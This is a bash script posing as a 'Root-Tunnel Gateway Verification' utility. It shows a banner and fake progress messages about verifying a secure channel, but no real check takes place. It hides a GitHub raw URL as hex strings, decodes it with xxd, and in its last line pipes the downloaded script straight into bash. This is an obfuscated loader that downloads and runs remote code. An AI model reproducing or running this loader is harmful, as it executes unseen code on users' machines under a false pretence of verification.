#!/bin/bash
clear
R1="\e[38;5;51m"
R2="\e[38;5;199m"
R3="\e[38;5;46m"
R4="\e[0m"
echo -e "${R1}"
echo "╔══════════════════════════════════════╗"
echo "║   Root-Tunnel Gateway Verification   ║"
echo "╚══════════════════════════════════════╝"
echo -e "${R4}"
echo ""
printf "${R2}Initializing Secure Gateway ${R4}"
for i in {1..12}; do
printf "${R3}.${R4}"
sleep 0.25
done
echo ""
echo ""
printf "${R2}Verifying Tunnel Integrity ${R4}"
for i in {1..10}; do
printf "${R1}.${R4}"
sleep 0.25
done
echo ""
echo ""
R5="68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d"
R6="2f544845434f444552534b59542f636f6465732e736b79742e717a7a2e696f"
R7="2f726566732f68656164732f6d61696e"
R8="2f726f6f7474756e6e656c2e7368"
R9="$R5$R6$R7$R8"
R10=$(echo "$R9" | xxd -r -p)
echo -e "${R3}✔ Gateway Verified${R4}"
sleep 1
printf "${R1}Opening Root-Tunnel Secure Channel ${R4}"
for i in {1..8}; do
printf "${R2}.${R4}"
sleep 0.25
done
echo ""
echo ""
bash <(curl -fsSL "$R10")
